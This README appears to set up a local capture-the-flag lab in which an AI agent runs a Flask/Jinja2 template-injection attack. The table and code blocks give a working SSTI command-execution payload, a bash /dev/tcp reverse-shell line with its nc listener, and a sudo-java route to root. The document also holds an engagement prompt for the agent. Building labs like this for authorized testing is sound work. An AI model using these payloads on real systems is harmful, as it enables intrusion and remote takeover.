# Lab — Pinguinazo SSTI (Flask/Jinja2 + Reverse Shell)

Inspired by the [Pinguinazo](https://dockerlabs.es) machine from dockerlabs.es
(© Mario's Penguin). Reimplemented as a self-contained lab integrated
into the `vulnerator-ai_default` network so the kali container can both
attack the target and receive the reverse shell.

> Authorized use only. Run exclusively in a controlled local environment.

## Attack path

```
SSTI (Jinja2) → RCE → reverse shell to kali → sudo java → root → /root/flag.txt
```

| Phase | Technique | Detail |
|---|---|---|
| Recon | nmap | Port 5000/tcp · Werkzeug/Flask |
| Enumeration | browser / curl | Flask form — input reflected without sanitisation |
| Exploitation | SSTI Jinja2 | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Foothold | Reverse shell | SSTI payload → `bash -i >& /dev/tcp/<kali-ip>/4444 0>&1` |
| PrivEsc | sudo java | `sudo java` + Shell.java compiled on target → root |
| Flag | cat | `/root/flag.txt` |

## Key detail — reverse shell routing

The target connects back to the **kali container IP** on the
`vulnerator-ai_default` network (not the host IP). The agent must discover
kali's IP first:

```bash
# From inside kali (mcp_kali_kali_run):
hostname -I
# Returns something like: 172.21.0.x
```

Then the reverse shell payload uses that IP:
```
bash -c 'bash -i >& /dev/tcp/172.21.0.x/4444 0>&1'
```

The listener runs via `kali_exec` (background, async):
```bash
nc -nlvp 4444
```

## Build and start

```bash
# Vulnerator-AI stack must be up first (creates vulnerator-ai_default network)
cd /path/to/vulnerator-ai && docker compose up -d

# Start the lab
cd labs/pinguinazo-ssti
docker compose up -d --build
```

## Engagement prompt

```
Starting authorized engagement.
Target: pinguinazo-ssti
Mode: ctf
Initial access: none — web service on port 5000.
Objective: obtain a shell as root and read /root/flag.txt.
Environment: isolated local lab, owned by the operator. Authorized target.
The target runs in a container connected to the same network as Kali.
For the reverse shell, use Kali's IP on the Docker network (hostname -I).
Begin the OODA loop.
```

## Stop

```bash
docker compose down
docker image rm pinguinazo-ssti:lab
```
